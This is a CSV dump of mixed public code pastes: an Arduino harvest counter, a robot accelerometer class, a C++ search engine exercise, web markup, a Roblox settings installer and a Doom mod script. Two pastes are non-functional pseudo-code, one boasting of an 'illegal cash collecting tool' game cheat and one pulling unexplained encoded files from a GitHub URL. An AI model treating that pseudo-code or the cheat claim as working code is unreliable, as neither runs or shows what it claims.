id,title,username,language,date,content
9dVDWXKQ,gettext highlighting syntax,LockdateforGHS,GetText,Friday 16th of June 2023 11:19:09 AM CDT,"msgctxt 

msgstr

\\ h"
3eG574Uf,Cash Collecter.ns,LockdateforGHS,GetText,Friday 16th of June 2023 11:11:36 AM CDT,"# This is the script for a object that collects (illegal Collected game money) and an admin collects it
import object.inventory.title
import object.logic.data

# icct short for illegal cash collecting tool

object.title : (""illegal cash collecting tool"")
object.model : ("",04,11,84929,%11&55==draw33,09,65,04427,563;79,:6:002,83,28764-919%92"") # encode is large (drawn from ap)

start logic,
 object.logic(StartScript):
 
 if player.collectCash = cheatfound then
   icct.collectCash:logic
  label.showAmountOfCash();
 then collect = true
   orgin.(amount=0),
button.text = ""Collect Cash"",
 if buttonpressed then
   cash.collect();
   goToCashInv,
 end logic,
 
 # i made like 230,000,000 cash from this. (Still work in progress)"
1wyNKnr3,suite kit,LockdateforGHS,GetText,Friday 16th of June 2023 10:56:27 AM CDT,"# v2
#Suite of tools to get started. 
#including code editor (python, javascript, arduino, kotlin, swift, makefile) [API]
web_menu(), start(00, 26225),
app.title = ""Suite Kit""
  
  code-editor = fetch
  
  url.http(""https://raw.githubusercontent.com/capybb/Pastebin-data/main/editor.code%20%206.1""), # language idk
suite.tools(""

url.http(""https://raw.githubusercontent.com/capybb/Pastebin-data/main/suite-tools.ql"") # language codeql


# to lazy for all it. Encoded hah from random"
kmcc4Sq8,Untitled,GigaOrts,C#,Friday 16th of June 2023 10:50:30 AM CDT,"//Вместо этого
static void MovePlayer(char[,] map, ref int pacmanPositionX, ref int pacmanPositionY, ConsoleKeyInfo pressedKey, char border)
{
    switch (pressedKey.Key)
    {
        case ConsoleKey.LeftArrow:
            ChangePosition(map[pacmanPositionY, pacmanPositionX - 1], ref pacmanPositionX, false, border);
            break;

        case ConsoleKey.RightArrow:
            ChangePosition(map[pacmanPositionY, pacmanPositionX + 1], ref pacmanPositionX, true, border);
            break;

        case ConsoleKey.UpArrow:
            ChangePosition(map[pacmanPositionY - 1, pacmanPositionX], ref pacmanPositionY, false, border);
            break;

        case ConsoleKey.DownArrow:
            ChangePosition(map[pacmanPositionY + 1, pacmanPositionX], ref pacmanPositionY, true, border);
            break;
    }
}

//Сделайте вот это (Написал примерно, корректируйте под свой код, надеюсь помогло навести на мысли)
static void MovePlayer(char[,] map, ref int pacmanPositionX, ref int pacmanPositionY, ConsoleKeyInfo pressedKey, char border)
{
    switch (pressedKey.Key)
    {
        case ConsoleKey.LeftArrow:
			pacmanPositionX--;
            break;

        case ConsoleKey.RightArrow:
            pacmanPositionX++;
            break;

        case ConsoleKey.UpArrow:
            pacmanPositionY--;
            break;

        case ConsoleKey.DownArrow:
            pacmanPositionY++;
            break;
    }

	ChangePosition(map[pacmanPositionY, pacmanPositionX], ref pacmanPositionX, false, border);
}"
4PLaP3EY,ZUMO Code,TheProgrammer69,C++,Friday 16th of June 2023 10:41:51 AM CDT,"#include ""Accelerometer.h""
 
Accelerometer::Accelerometer() {}
Accelerometer::~Accelerometer() {}
 
void Accelerometer::sensorenInitialiseren() {
  /*!
   * \brief Initialiseert de sensoren en geeft een melding als dit niet lukt.
   *
   * Deze functie initialiseert de sensoren en geeft een melding als dit niet lukt.
   * Als de sensoren niet gedetecteerd worden, wordt de rode LED op de Zumo-robot
   * ingeschakeld en wordt er een bericht op de seriële monitor geprint.
   */
  Serial.begin(9600);
  Wire.begin();
  imu.init();
  if (!imu.init())
  {
    ledRed(1);
    while(1)
    {
      Serial.println((""De initialisatie van de sensoren is mislukt""));
      delay(100);
    }
    Serial.print(""Kaas"");
  }
  imu.enableDefault();
}
 
bool Accelerometer::brugKantelingDetecteren() {
  /*!
   * \brief Detecteert een kantelbrug op basis van de helling van de robot.
   *
   * Deze functie gebruikt de accelerometergegevens om de helling van de robot te detecteren.
   * Als de helling groter is dan een drempelwaarde, wordt aangenomen dat de robot een kantelbrug nadert.
   * Op basis van deze detectie kunt u de snelheid aanpassen, de rijrichting wijzigen of andere relevante acties ondernemen.
   */
 
  imu.readAcc();
  int acc_x = imu.a.x;
  int acc_z = imu.a.z;
 
  // Bereken de helling in graden
  float helling1 = atan2(acc_x, acc_z) * 180.0 / PI;
  delay(20);
  imu.readAcc();
  acc_x = imu.a.x;
  acc_z = imu.a.z;
 
  // Bereken de helling in graden
  float helling2 = atan2(acc_x, acc_z) * 180.0 / PI;
 
  float helling = (helling1 + helling2)/2;
  // Controleer of de helling groter is dan de drempelwaarde voor kantelbrug
  if ((helling) > kantelbrugDrempelwaarde) {
    // Voer de gewenste acties uit voor kantelbrug detectie
    Serial.println(""Hel op"");
    return true;
  }
  else{
    // Voer de gewenste acties uit voor kantelbrug detectie
    Serial.println(""Helling Af"");
    return false;
  }
}
 
 
void Accelerometer::snelheidsverschilBerekenen() {
  /*!
   * \brief Bereken de daadwerkelijke snelheid op basis van het verschil in acceleratie en tijd.
   *
   * Deze functie leest de waarde van de acceleratie op twee momenten en berekent de snelheid
   * op basis van de verandering in acceleratie en de opgegeven tijdsinterval (delta t). De snelheid
   * wordt bijgewerkt door de integratie van de veranderingen in acceleratie en geprint op de seriële monitor.
   */
 
  imu.readAcc();
  int acc_x_1 = imu.a.x;
  delay(400);   
  imu.readAcc();
  int acc_x_2 = imu.a.x;
  int delta_a = acc_x_2 - acc_x_1;
 
  float snelheid = beginsnelheid; // Beginsnelheid
 
  while (!(abs(delta_a) < drempelwaarde)) {
    imu.readAcc();
    int acc_x_prev = acc_x_2;
    acc_x_2 = imu.a.x;
    delta_a = acc_x_2 - acc_x_prev;
 
    // Voeg het teken van delta_a toe aan de snelheid
    if (delta_a > 0) {
      snelheid += delta_a * delta_t; // Verhoog de snelheid bij acceleratie
    } else if (delta_a < 0) {
      snelheid += delta_a * delta_t; // Verlaag de snelheid bij vertraging
    }
    Serial.println(snelheid);
    Serial.println(""snelheid="" + String(snelheid));
  }
}
 
 
void Accelerometer::botsingControleren() {
  /*!
   * \brief Geeft een melding als de snelheid plots naar 0 gaat.
   *
   * Deze functie geeft een melding als de snelheid plots naar 0 gaat, wat kan duiden op een
   * botsing of crash. Het bericht ""Ouch, dat deed pijn"" wordt geprint op de seriële monitor.
   */
  if (snelheid == 0){
    Serial.println(""Ouch, dat deed pijn"");
  }
}
 
void Accelerometer::controleerLinksRechtsBeweging() {
    /*!
    * \brief Controleert de links-rechtsbeweging van de Zumo-robot op basis van de acceleratiewaarden.
    *
    * Deze functie controleert de links-rechtsbeweging van de Zumo-robot op basis van de acceleratiewaarden.
    * Als de robot in de y-richting beweegt, wordt gecontroleerd op veranderingen in de x-richting en vice versa.
    * Pas de drempelwaarden aan om de gevoeligheid van de bewegingsdetectie aan te passen.
    */
    // Lees de acceleratiewaarden
    imu.readAcc();
    float accX = imu.a.x;
    float accY = imu.a.y;
 
    // Controleer de links-rechtsbeweging op basis van de acceleratie
    if (abs(accY) > drempelwaarde) {
        // Beweeg in de y-richting, controleer de x-richting
        if (accX > drempelwaarde) {
            // Beweeg naar rechts
            // Voer hier uw acties uit
            Serial.print(""Je beweegt naar rechts"");
        } else if (accX < -drempelwaarde) {
            // Beweeg naar links
            // Voer hier uw acties uit
            Serial.print(""Je beweegt naar links"");
        }
    } else if (abs(accX) > drempelwaarde) {
        // Beweeg in de x-richting, controleer de y-richting
        if (accY > drempelwaarde) {
            // Beweeg naar voren
            // Voer hier uw acties uit
            Serial.print(""Je beweegt naar rechts2"");
 
        } else if (accY < -drempelwaarde) {
            // Beweeg naar achteren
            // Voer hier uw acties uit
            Serial.print(""Je beweegt naar links2"");
 
        }
    }
    // Bewaar de huidige acceleratiewaarden voor de volgende iteratie
    vorigeAccX = accX;
    vorigeAccY = accY;
}"
bud3fufr,harvesting time and surface,sdfdsfdsfhhhh,C++,Friday 16th of June 2023 09:52:15 AM CDT,"#include <MD_Parola.h>
#include <MD_MAX72xx.h>
#include <SPI.h>
#include <Wire.h>
#include <DS1307.h>
#include <EasyButton.h>

#define HARDWARE_TYPE MD_MAX72XX::FC16_HW
//#define HARDWARE_TYPE MD_MAX72XX::GENERIC_HW
 
#define MAX_DEVICES 4

#define surfaceCS 8
#define timeCS 9
EasyButton b1(12);
EasyButton b2(3);
EasyButton s1(4);
EasyButton s2(5);
EasyButton b3(6);
EasyButton b4(A2, 35, 1, 0);
DS1307 clock;
MD_Parola surfaceDisplay = MD_Parola(HARDWARE_TYPE, surfaceCS, MAX_DEVICES);
MD_Parola timeDisplay = MD_Parola(HARDWARE_TYPE, timeCS, MAX_DEVICES);

//wejscia według rysunku/schematu
/*#define s1 2 //przycisk start/stop
#define s2 3 //przycisk zerowania
#define b1 4 //czujnik indukcyjny po jego zadziałaniu umożliwia dodawanie powierzchni
#define b2 5 // czujnik indukcyjny wykrywa obrót koła i dodaje powierzchnie
#define b3 6 //czujnik indukcyjny po jego zadziałaniu nblokuje dodawanie powierzchni
#define b4 10 //czujnik podniesienia hederu*/
#define h1 A0 //dioda zielona, swieci - liczy
#define h2 A1// dioda czerwona - swieci - nie liczy
bool programState = 0;// 0 - nie liczy, 1 - liczy obsługiwane przez przycisk, zatrzymuje i czas i powierzchnie
bool surfaceCount = 0; //jak wyzej, obsługiwane przez przycisk i czujniki, zatrzymuje tylko powierzchnie
float surface = 0; //powierzchnia w hektarach
int hours = 0;
int minutes = 0;
const float cuttingWidth = 0.7;
const float wheelRadius = 4.15;
//bool hh1 = 1;
bool fullTurn = 1;
//unsigned long h1Time = 0;

void setup() {
  // put your setup code here, to run once:
  Serial.begin(9600);
  
  clock.begin();
  surfaceDisplay.begin();
  clock.fillByYMD(0,0,0);//Jan 19,2013
	clock.fillByHMS(0,0,0);//15:28 30""
	clock.fillDayOfWeek(SAT);//Saturday
	clock.setTime();//write time to the RTC chip
  clock.stopClock();
  surfaceDisplay.setIntensity(15);
  surfaceDisplay.displayClear();
  surfaceDisplay.setTextAlignment(PA_CENTER);
  surfaceDisplay.print(""##############"");
  timeDisplay.begin();
  timeDisplay.setIntensity(15);
  timeDisplay.displayClear();
  timeDisplay.setTextAlignment(PA_CENTER);
  timeDisplay.print(""##################"");
  s1.begin();
  s2.begin();
  b1.begin();
  b2.begin();
  b3.begin();
  b4.begin();

  /*pinMode(s1, INPUT_PULLUP);
  pinMode(s2, INPUT_PULLUP);
  pinMode(b1, INPUT_PULLUP);
  pinMode(b2, INPUT_PULLUP);
  pinMode(b3, INPUT_PULLUP);
  pinMode(b4, INPUT_PULLUP);*/
  pinMode(h1, OUTPUT);
  pinMode(h2, OUTPUT);
  //digitalWrite(h1, 1);
}

void loop() {
  s1.read();
  s2.read();
  b1.read();
  b2.read();
  b3.read();
  b4.read();
  if(s1.wasPressed())
  {
    programState = !programState;
    if(programState)
    {
      clock.startClock();
    }
    if(!programState)
    {
      clock.stopClock();
    }
  }  //wcisnięcie przycisku zmienia stan na przeciwny
   s2.onPressedFor(3000, reset);
  if(programState)
  {
    //clock.startClock();
    digitalWrite(h1, 1);
    if(b1.wasPressed() && fullTurn)
    {
      surfaceCount = 1;
      fullTurn = 0;
    }
    if(b4.isPressed() || b3.wasPressed())
    {
      fullTurn = b3.wasPressed();
      surfaceCount = 0;
    }
    if(b2.wasPressed() && surfaceCount)
    {
      surface += cuttingWidth * 2 * 3.14 * wheelRadius * 0.0001;
      surfaceCount = 0;
      fullTurn = 0;
      //surfaceDisplay.displayClear();
      //surfaceDisplay.print(surface);
    }
    clock.getTime();
    minutes = clock.minute;
    hours = clock.hour;
  }
  //surfaceDisplay.print(surface);
  displayField();
  displayTime();
  digitalWrite(h1, programState);
  digitalWrite(h2, !programState);
}

void displayField()
{
  int realPart;
  int fractionPart;
  int fractionPartTens;
  int fractionPartHundreds;
  float field = surface;
  field += 0.005;
  field *= 100;
  int fieldInt = field;
  fractionPart = fieldInt % 100;
  fractionPartHundreds = fractionPart % 10;
  fractionPart *= 0.1;
  fractionPartTens = fractionPart % 10;
  realPart = fieldInt / 100;
  String realPartDisplay = String(realPart);
  String fractionPartTensDisplay = String(fractionPartTens);
  String fractionPartHundredsDisplay = String(fractionPartHundreds);
  surfaceDisplay.print(realPartDisplay + ""."" + fractionPartTensDisplay + fractionPartHundredsDisplay);
  //Serial.println(realPartDisplay + "","" + fractionPartDisplay);
}

void displayTime()
{
  int minuteS = minutes;
  int minutesOnes = minuteS % 10;
  minuteS *= 0.1;
  int minutesTens = minuteS % 10;
  String minutesOnesDisplay = String(minutesOnes);
  String minutesTensDisplay = String(minutesTens);
  String hoursDisplay = String(hours);
  timeDisplay.print(hoursDisplay + "":"" + minutesTensDisplay + minutesOnesDisplay);
  //Serial.println(hoursDisplay + "":"" + minutesDisplay);
}
void reset()
{
  if(!programState)
  {
  surface = 0;
  hours = 0;
  minutes = 0;
  clock.fillByHMS(0,0,0);
  clock.setTime();
  }
}
"
mQ8veTxh,Untitled,Clamator,CSS,Friday 16th of June 2023 09:43:40 AM CDT,".breadcrumbs {
  @media (max-width: 801px) {
    @apply hidden;
  }
}

.breadcrumbs-small-screen {
  @apply flex flex-row gap-8 flex-nowrap text-s text-text items-center;
  @media (min-width: 802px) {
    @apply hidden;
  }
  @media screen and (max-width: 480px) {
    @apply w-3/4;
  }
}

.breadcrumbs-small-screen-image {
  @apply w-20 h-20 block;
  background: url(""../../img/card-fullpage/breadcrumb-home.svg"") no-repeat center;
  background-size: contain;
}

.breadcrumbs-small-screen-dots {
  @apply relative;
}

.breadcrumbs-arrow {
  @apply absolute h-12 w-32 hidden;
  left: -1.1rem;
  background: url(""../../img/card-fullpage/bread-arrow.svg"") no-repeat center;
  background-size: contain;
}

.breadcrumbs-path-hidden-text {
  @apply absolute hidden bg-white z-10 p-16 flex flex-col gap-8;
  border: 1px solid black;
  width: 20rem;
  top: 2.9rem;
  left: -1.2rem;
}

.breadcrumbs-small-screen-dots:hover
.breadcrumbs-arrow {
  @apply block;
}

.breadcrumbs-small-screen-dots:hover
.breadcrumbs-path-hidden-text {
  @apply block;
}


.breadcrumbs-icons {
  @apply flex flex-row gap-16;
  @media (min-width: 801px) {
    @apply hidden;
  }
}

@media screen and (max-width: 480px) {
  .breadcrumbs-small-screen-path {
    @apply overflow-hidden whitespace-nowrap;
    text-overflow: ellipsis;
    max-width: calc(80%);
  }
}"
s7BwrgTZ,Untitled,Clamator,HTML,Friday 16th of June 2023 09:42:17 AM CDT," <div class=""flex justify-between px-24 items-center"">
        <p class=""breadcrumbs p-24"">
          <a href=""#"">Главная </a><span>/</span>
          <a href=""#"">Книги </a><span>/</span>
          <a href=""#"">Все книги </a><span>/</span>
          <a href=""#"">Художественная литература </a><span>/</span>
          <a href=""#"">Русские народные сказки</a><span>/</span>
          <a href=""#"">Безработный Дед Мороз. Волшебный круговорот</a>
        </p>
        <div class=""breadcrumbs-small-screen my-24"">
          <div class=""breadcrumbs-small-screen-image""></div>
          <div class=""breadcrumbs-small-screen-dots "">
            ...
            <div class=""breadcrumbs-arrow""></div>
            <div class=""breadcrumbs-path-hidden-text"">
              <a class=""text-s"" href=""#"">Книги</a>
              <a class=""text-s"" href=""#"">Все книги</a>
              <a class=""text-s"" href=""#"">Художественная литература</a>
              <a class=""text-s"" href=""#"">Русские народные сказки</a>
            </div>
          </div>
          <div class=""breadcrumbs-small-screen-path"">Безработный Дед Мороз. Волшебный круговорот</div>
        </div>
        <div class=""breadcrumbs-icons"">
          <a href=""#"" class=""item_card-external-link""></a>
          <button class=""item_card_add_to_favourite""></button>
        </div>
      </div>"
WV8siEFW,Untitled,zimovid,C++,Friday 16th of June 2023 09:35:06 AM CDT,"#include <algorithm>
#include <cmath>
#include <iostream>
#include <map>
#include <set>
#include <string>
#include <utility>
#include <vector>

using namespace std;

const int MAX_RESULT_DOCUMENT_COUNT = 5;

string ReadLine() {
    string s;
    getline(cin, s);
    return s;
}

int ReadLineWithNumber() {
    int result;
    cin >> result;
    ReadLine();
    return result;
}

vector<string> SplitIntoWords(const string& text) {
    vector<string> words;
    string word;
    for (const char c : text) {
        if (c == ' ') {
            if (!word.empty()) {
                words.push_back(word);
                word.clear();
            }
        } else {
            word += c;
        }
    }
    if (!word.empty()) {
        words.push_back(word);
    }

    return words;
}

struct Document {
    int id;
    double relevance;
    int rating;
};

enum class DocumentStatus {
    ACTUAL,
    IRRELEVANT,
    BANNED,
    REMOVED,
};

class SearchServer {
public:
    int GetDocumentCount() const {
        return static_cast<int>(documents_.size());
    }
    
    tuple<vector<string>, DocumentStatus> MatchDocument(const string& raw_query, int document_id) const {
        const Query query = ParseQuery(raw_query);

        // Check if the document matches the query.
        bool is_match = true;
        if (!query.minus_words.empty()) {  // Check only when there are minus-words.
            for (const string& word : query.minus_words) {
                if (word_to_document_freqs_.count(word) > 0 &&
                    word_to_document_freqs_.at(word).count(document_id) > 0) {
                    is_match = false;  // The document contains a minus-word.
                    break;
                }
            }
        }

        if (is_match) {
            vector<string> matched_words;
            for (const string& word : query.plus_words) {
                if (word_to_document_freqs_.count(word) > 0 &&
                    word_to_document_freqs_.at(word).count(document_id) > 0) {
                    matched_words.push_back(word);
                }
            }
            sort(matched_words.begin(), matched_words.end());
            matched_words.erase(unique(matched_words.begin(), matched_words.end()), matched_words.end());

            return {matched_words, documents_.at(document_id).status};
        } else {
            return {{}, DocumentStatus::IRRELEVANT};
        }
    }
    
    void SetStopWords(const string& text) {
        for (const string& word : SplitIntoWords(text)) {
            stop_words_.insert(word);
        }
    }

    void AddDocument(int document_id, const string& document, DocumentStatus status,
                     const vector<int>& ratings) {
        const vector<string> words = SplitIntoWordsNoStop(document);
        const double inv_word_count = 1.0 / words.size();
        for (const string& word : words) {
            word_to_document_freqs_[word][document_id] += inv_word_count;
        }
        documents_.emplace(document_id, DocumentData{ComputeAverageRating(ratings), status});
    }

    vector<Document> FindTopDocuments(const string& raw_query,
                                      DocumentStatus status = DocumentStatus::ACTUAL) const {
        const Query query = ParseQuery(raw_query);
        auto matched_documents = FindAllDocuments(query, status);

        sort(matched_documents.begin(), matched_documents.end(),
             [](const Document& lhs, const Document& rhs) {
                 return lhs.relevance > rhs.relevance;
             });
        if (matched_documents.size() > MAX_RESULT_DOCUMENT_COUNT) {
            matched_documents.resize(MAX_RESULT_DOCUMENT_COUNT);
        }
        return matched_documents;
    }

private:
    struct DocumentData {
        int rating;
        DocumentStatus status;
    };

    set<string> stop_words_;
    map<string, map<int, double>> word_to_document_freqs_;
    map<int, DocumentData> documents_;

    bool IsStopWord(const string& word) const {
        return stop_words_.count(word) > 0;
    }

    vector<string> SplitIntoWordsNoStop(const string& text) const {
        vector<string> words;
        for (const string& word : SplitIntoWords(text)) {
            if (!IsStopWord(word)) {
                words.push_back(word);
            }
        }
        return words;
    }

    static int ComputeAverageRating(const vector<int>& ratings) {
        if (ratings.empty()) {
            return 0;
        }
        int rating_sum = 0;
        for (const int rating : ratings) {
            rating_sum += rating;
        }
        return rating_sum / static_cast<int>(ratings.size());
    }

    struct QueryWord {
        string data;
        bool is_minus;
        bool is_stop;
    };

    QueryWord ParseQueryWord(string text) const {
        bool is_minus = false;
        // Word shouldn't be empty
        if (text[0] == '-') {
            is_minus = true;
            text = text.substr(1);
        }
        return {text, is_minus, IsStopWord(text)};
    }

    struct Query {
        set<string> plus_words;
        set<string> minus_words;
    };

    Query ParseQuery(const string& text) const {
        Query query;
        for (const string& word : SplitIntoWords(text)) {
            const QueryWord query_word = ParseQueryWord(word);
            if (!query_word.is_stop) {
                if (query_word.is_minus) {
                    query.minus_words.insert(query_word.data);
                } else {
                    query.plus_words.insert(query_word.data);
                }
            }
        }
        return query;
    }

    // Existence required
    double ComputeWordInverseDocumentFreq(const string& word) const {
        return log(documents_.size() * 1.0 / word_to_document_freqs_.at(word).size());
    }

    vector<Document> FindAllDocuments(const Query& query, DocumentStatus status) const {
        map<int, double> document_to_relevance;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            const double inverse_document_freq = ComputeWordInverseDocumentFreq(word);
            for (const auto [document_id, term_freq] : word_to_document_freqs_.at(word)) {
                if (documents_.at(document_id).status == status) {
                    document_to_relevance[document_id] += term_freq * inverse_document_freq;
                }
            }
        }

        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            for (const auto [document_id, _] : word_to_document_freqs_.at(word)) {
                document_to_relevance.erase(document_id);
            }
        }

        vector<Document> matched_documents;
        for (const auto [document_id, relevance] : document_to_relevance) {
            matched_documents.push_back(
                {document_id, relevance, documents_.at(document_id).rating});
        }
        return matched_documents;
    }
};

void PrintMatchDocumentResult(int document_id, const vector<string>& words, DocumentStatus status) {
    cout << ""{ ""s
         << ""document_id = ""s << document_id << "", ""s
         << ""status = ""s << static_cast<int>(status) << "", ""s
         << ""words =""s;
    for (const string& word : words) {
        cout << ' ' << word;
    }
    cout << ""}""s << endl;
}
int main() {
    SearchServer search_server;
    search_server.SetStopWords(""и в на""s);
    search_server.AddDocument(0, ""белый кот и модный ошейник""s,        DocumentStatus::ACTUAL, {8, -3});
    search_server.AddDocument(1, ""пушистый кот пушистый хвост""s,       DocumentStatus::ACTUAL, {7, 2, 7});
    search_server.AddDocument(2, ""ухоженный пёс выразительные глаза""s, DocumentStatus::ACTUAL, {5, -12, 2, 1});
    search_server.AddDocument(3, ""ухоженный скворец евгений""s,         DocumentStatus::BANNED, {9});
    const int document_count = search_server.GetDocumentCount();
    for (int document_id = 0; document_id < document_count; ++document_id) {
        const auto [words, status] = search_server.MatchDocument(""пушистый кот""s, document_id);
        PrintMatchDocumentResult(document_id, words, status);
    }
} 
"
AgnHjnXv,ClientAppSettings Autoinstall,KH0NL,Python,Friday 16th of June 2023 09:11:31 AM CDT,"import os
from time import sleep
user = os.getlogin() 
path = (f'C:/Users\{user}/AppData/Local/Roblox/Versions')
pathfound=False
alrexist=False
list1 = os.listdir(path)
for file in list1:
    list2 = os.listdir(f'C:/Users/{user}/AppData/Local/Roblox/Versions/{file}')
    for x in list2:
        if x == ""RobloxPlayerBeta.exe"": 
            l = (f'C:/Users/{user}/AppData/Local/Roblox/Versions/{file}')
            path=l
            print(l)
            pathfound=True
print(path)
if pathfound == True:
   
    y = os.listdir(path)
    for o in y:
        if o == ""ClientSettings"":
            
            alrexist=True
            break
        else:
            print()

if alrexist == True:
    print(""COULD NOT INSTALL BECAUSE CLIENTSETTING ALREADY EXISTS"")
else:
    folder=""ClientSettings""
    mode=0o666
    s = os.makedirs(f'{path}/ClientSettings',mode)
    zpath = (f'{path}/ClientSettings')
    sleep(1)
    json = open(f'{zpath}/ClientAppSettings.json',""w+"")
    data=['{ \n','  ""DFIntTaskSchedulerTargetFps"": 1000, \n', '  ""FFlagHandleAltEnterFullscreenManually"":""False"" \n', '}']
    json.writelines(data)
    json.close()
print(""DONE!"")
k = input(""press enter to exit prompt"")"
3FGaRDb3,Railgun rails and damage things,Tomasm21,C++,Friday 16th of June 2023 09:05:41 AM CDT,"#library ""SW""
#include ""zcommon.acs""
#include ""zdaemon.acs""

//...
Script 1024 (int lowang){

int i;
int LoWangTID;

if(lowang == 0){

    int x = 0;
    int y = 0;
    int z = 0;
	int xb, yb, zb;
	int railTID = 46000+Various_tags[9];
    Various_tags[9] = Various_tags[9] + 1;    
    if (Various_tags[9] > 999) Various_tags[9] = 0;
	
	thing_changetid(0, railTID);
      
    setactivatortotarget(0); 
 
	LoWangTID = activatorTID();

	for(i = 0; i < 32; i++){
		if(playerLoWangClone[i] == LoWangTID){
			break;
		}
	}
	
	setactorangle(railTID,getactorangle(0));
	
	//Placing a bit - 4pixels to the right from the actor center
	xb = getactorx(railTID) + cos (getactorangle(0)-0.25) * 4;
	yb = getactory(railTID) + sin (getactorangle(0)-0.25) * 4;
	zb = getactorz(railTID);
	
    setactorposition(railTID, xb, yb, zb, 0);
	
	setactivator(railTID);
	for(int j = 0; j < 2; j++){
		activatorsound(""RAILGF2"",255);
	}
	
    while (thingcount(T_NONE,railTID) == 1)
    {
        x = getactorx(railTID);
        y = getactory(railTID);
        z = getactorz(railTID);
		
		//Rail graphics class thing
        spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34000);
        //Damage thing with shorter duration and no rendering style
        spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35000);

        setactorposition(LoWangTID+i*5 + 34000,x,y,z,0);
		setactorposition(LoWangTID+i*5 + 35000,x,y,z,0);
		thing_changetid(LoWangTID+i*5 + 34000, 0);
		thing_changetid(LoWangTID+i*5 + 35000, 0);
		
        delay(1);
    }
//...
}"
